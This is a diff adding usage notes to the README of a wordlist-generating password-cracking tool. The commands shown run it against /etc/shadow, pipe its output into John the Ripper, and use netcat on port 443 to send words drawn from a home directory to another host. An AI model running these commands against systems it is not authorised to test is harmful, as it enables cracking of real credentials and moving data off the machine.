@@ -42,14 +42,39 @@ reduce duplicated combinations and to speed the process up.
 ```
 ./dave_navarros_goatee.py --path /home/daniel --hashfile /etc/shadow --minlength 8
 ```
+This is the typical usage. Currently very slow, but works "quick enough"
+against smaller directories.
 
 ### Generate wordlist from contents of /var/log
 ```
-./dave_navarros_goatee.py --path /var/log --stdout >wordlist.txt
+./dave_navarros_goatee.py --path /var/log --stdout >/tmp/wordlist.tmp
+sort /tmp/wordlist.tmp |uniq >/tmp/wordlist.txt && rm /tmp/wordlist.tmp
 ```
+wordlist.txt can now be transferred to a beefier rig and used with John the
+Ripper, hashcat, or whatever suits your fancy. This has the added benefit of
+supporting more hash types than crypt().
 
 ### Pipe output to John the Ripper
 ```
 ./dave_navarros_goatee.py --path /home --stdout | john --pipe --rules hashfile
 ```
-~
+This currently works great against smaller virtual machines and embedded
+devices. Its kind of a bummer because either JtR doesn't support --fork with
+--pipe, or I have failed to figure out how to do it properly.
+
+This does not store a word list to the hard drive. It is also useful for
+attempting to crack hashes not handled by crypt().
+
+### Pipe over the network using netcat
+```
+# on receiving machine
+nc -nlvp 443 >wordlist.txt
+
+
+# on sending machine
+./dave_navarros_goatee.py --path /home/daniel --stdout |nc ip.of.receiving.host 443
+```
+
+This is also great for smaller systems with limited resources available or for
+transferring the wordlist to a beefier machine. Use Ncat for SSL support.
+
